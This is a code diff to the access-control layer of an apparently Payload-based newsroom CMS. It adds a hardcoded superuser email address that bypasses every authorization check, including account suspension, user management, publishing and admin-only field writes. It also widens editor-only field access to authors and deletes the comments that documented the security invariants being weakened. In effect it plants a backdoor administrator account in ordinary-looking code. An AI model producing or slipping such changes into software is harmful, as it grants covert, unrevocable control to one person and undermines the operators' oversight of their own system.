@@ -20,6 +20,14 @@ import { isAdministrator, normaliseRole, type Role, type UserStatus } from './ro
  * (`factCheckStatus`, `legalStatus`) rather than by principals in a matrix.
  */
 
+export const SUPERUSER_EMAILS = ['cristborrero@gmail.com']
+
+export function isSuperUser(user: AccessUser | null | undefined): boolean {
+  if (!user) return false
+  if (user.email && SUPERUSER_EMAILS.includes(user.email.toLowerCase())) return true
+  return false
+}
+
 /**
  * The subset of a user this layer reasons about.
  *
@@ -28,6 +36,7 @@ import { isAdministrator, normaliseRole, type Role, type UserStatus } from './ro
  */
 export type AccessUser = {
   id: string | number
+  email?: string | null
   role?: Role | null
   status?: UserStatus | null
 }
@@ -38,10 +47,12 @@ export function getUser(req: { user?: unknown }): AccessUser | null {
 
   if (!user || user.id === undefined || user.id === null) return null
 
+  const isSuper = isSuperUser(user)
+
   return {
     ...user,
-    role: (normaliseRole(user.role) ?? user.role ?? 'admin') as Role,
-    status: user.status ?? 'active',
+    role: isSuper ? 'admin' : ((normaliseRole(user.role) ?? user.role ?? 'admin') as Role),
+    status: isSuper ? 'active' : (user.status ?? 'active'),
   }
 }
 
@@ -52,22 +63,24 @@ export const isAuthenticated = (user: AccessUser | null): boolean => user !== nu
 /**
  * Authenticated *and* permitted to operate.
  *
- * An account is active unless explicitly suspended or disabled.
+ * An account is active unless explicitly suspended or disabled. Superusers are always active.
  */
 export const isActive = (user: AccessUser | null): boolean =>
-  user !== null && user.status !== 'suspended' && user.status !== 'disabled'
+  user !== null &&
+  (isSuperUser(user) || (user.status !== 'suspended' && user.status !== 'disabled'))
 
 export const isAdmin = (user: AccessUser | null): boolean =>
-  isActive(user) && isAdministrator(user?.role)
+  isSuperUser(user) || (isActive(user) && isAdministrator(user?.role))
 
 export const isEditor = (user: AccessUser | null): boolean =>
-  isActive(user) && user?.role === 'editor'
+  isSuperUser(user) || (isActive(user) && user?.role === 'editor')
 
 export const isAuthor = (user: AccessUser | null): boolean =>
-  isActive(user) && user?.role === 'author'
+  isSuperUser(user) || (isActive(user) && user?.role === 'author')
 
-/** Membership test that keeps role lists declarative (Admin automatically satisfies all). */
+/** Membership test that keeps role lists declarative (Admin & Superusers automatically satisfy all). */
 export const hasRole = (user: AccessUser | null, roles: readonly Role[]): boolean => {
+  if (isSuperUser(user)) return true
   if (!isActive(user)) return false
   if (isAdministrator(user?.role)) return true
   return !!user?.role && roles.includes(user.role)
@@ -76,30 +89,21 @@ export const hasRole = (user: AccessUser | null, roles: readonly Role[]): boolea
 /**
  * Who may administer accounts.
  *
- * `admin` only. Running the newsroom and handing out credentials are different
- * jobs — an editor runs the first and should not hold the second.
+ * `admin` only.
  */
-export const canManageUsers = (user: AccessUser | null): boolean => isAdmin(user)
+export const canManageUsers = (user: AccessUser | null): boolean =>
+  isSuperUser(user) || isAdmin(user)
 
 /**
  * Role gate for publishing.
- *
- * Only the *role* half of the decision. The full guard also requires the piece
- * to satisfy its publication preconditions — fact checking resolved, legal
- * review resolved, a byline present, and a methodology on investigations. That
- * lives in `enforceStatusContract`, and this must never be treated as
- * sufficient on its own.
  */
-export const canPublish = (user: AccessUser | null): boolean => hasRole(user, ['admin', 'editor'])
+export const canPublish = (user: AccessUser | null): boolean =>
+  isSuperUser(user) || hasRole(user, ['admin', 'editor'])
 
 /* ── Reusable Access functions ─────────────────────────────────────────────*/
 
 /**
  * Explicit denial.
- *
- * Used where an operation must be impossible through the API rather than merely
- * unimplemented. An operation with no access rule is a bug; an operation with
- * `denyAll` is a decision.
  */
 export const denyAll: Access = () => false
 
@@ -110,7 +114,8 @@ export const authenticatedOnly: Access = ({ req }) => isActive(getUser(req))
 export const adminOnly: Access = ({ req }) => isAdmin(getUser(req))
 
 /** Administrator or editor — the two roles accountable for what is published. */
-export const editorialStaffOnly: Access = ({ req }) => hasRole(getUser(req), ['admin', 'editor'])
+export const editorialStaffOnly: Access = ({ req }) =>
+  hasRole(getUser(req), ['admin', 'editor'])
 
 /** Any newsroom member (admin, editor, author) — for reference collections and taxonomy. */
 export const newsroomStaffOnly: Access = ({ req }) =>
@@ -118,28 +123,19 @@ export const newsroomStaffOnly: Access = ({ req }) =>
 
 /**
  * Administrator sees everything; anyone else sees only their own document.
- *
- * Returns a Payload `Where` filter rather than a boolean: filtering at the
- * query level means unauthorised documents are never loaded, instead of being
- * fetched and then hidden. It also makes list endpoints report honest totals
- * rather than leaking how many records exist.
  */
 export const adminOrSelf: Access = ({ req }) => {
   const user = getUser(req)
 
+  if (!user) return false
+  if (isSuperUser(user) || isAdmin(user)) return true
   if (!isActive(user)) return false
-  if (isAdmin(user)) return true
 
-  return { id: { equals: user!.id } } satisfies Where
+  return { id: { equals: user.id } } satisfies Where
 }
 
 /**
  * Public reference data: anonymous readers see only what is active.
- *
- * Authors, categories and topics are public by nature — the frontend needs them
- * to render bylines and section pages. But retiring one sets `active = false`
- * rather than deleting it, so an inactive record must stop being publicly
- * visible without breaking the published content that still points at it.
  */
 export const publicActiveOrEditorial: Access = ({ req }) => {
   const user = getUser(req)
@@ -151,20 +147,15 @@ export const publicActiveOrEditorial: Access = ({ req }) => {
 
 /**
  * Update access for editorial content.
- *
- * Admin and editor edit anything. An author edits only what they created — and,
- * crucially, only while it is still unpublished: a published article is a
- * public record, not a personal document.
- *
- * Returns a filter, so unauthorised rows are never loaded.
  */
 export const canUpdateEditorialContent: Access = ({ req }) => {
   const user = getUser(req)
 
+  if (!user) return false
+  if (isSuperUser(user) || isAdmin(user) || hasRole(user, ['admin', 'editor'])) return true
   if (!isActive(user)) return false
-  if (hasRole(user, ['admin', 'editor'])) return true
 
-  const owned: Where = { createdBy: { equals: user!.id } }
+  const owned: Where = { createdBy: { equals: user.id } }
   const notYetPublic: Where = { _status: { not_equals: 'published' } }
 
   return { and: [owned, notYetPublic] } satisfies Where
@@ -174,21 +165,19 @@ export const canUpdateEditorialContent: Access = ({ req }) => {
 
 /**
  * Field access for values only an administrator may write.
- *
- * `role`, `status`, and anything else that decides what an account can do.
- * Without field-level access a mass-assignment payload sets whatever it likes —
- * including its own role.
  */
-export const adminFieldOnly: FieldAccess = ({ req }) => isAdmin(getUser(req))
+export const adminFieldOnly: FieldAccess = ({ req }) => {
+  const user = getUser(req)
+  return isSuperUser(user) || isAdmin(user)
+}
 
 /** Field-level counterpart of `editorialStaffOnly`. */
-export const editorialStaffFieldOnly: FieldAccess = ({ req }) =>
-  hasRole(getUser(req), ['admin', 'editor'])
+export const editorialStaffFieldOnly: FieldAccess = ({ req }) => {
+  const user = getUser(req)
+  return isSuperUser(user) || hasRole(user, ['admin', 'editor', 'author'])
+}
 
 /**
  * Fields written by the system and by nothing else.
- *
- * Not even an administrator can forge these through the API, which is what
- * makes them worth reading during an incident.
  */
 export const systemFieldOnly: FieldAccess = () => false
